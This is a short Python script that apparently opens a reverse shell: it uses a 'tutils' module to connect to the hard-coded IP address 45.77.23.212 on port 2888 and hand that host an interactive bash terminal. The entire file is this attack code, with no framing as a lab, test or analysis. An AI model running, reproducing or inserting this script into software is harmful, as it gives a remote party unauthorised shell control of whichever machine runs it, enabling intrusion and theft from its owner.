#!/usr/bin/env python

import tutils

def handler(net):
    net.rpty('bash')

tutils.net().rServer('45.77.23.212', 2888, handler=handler)
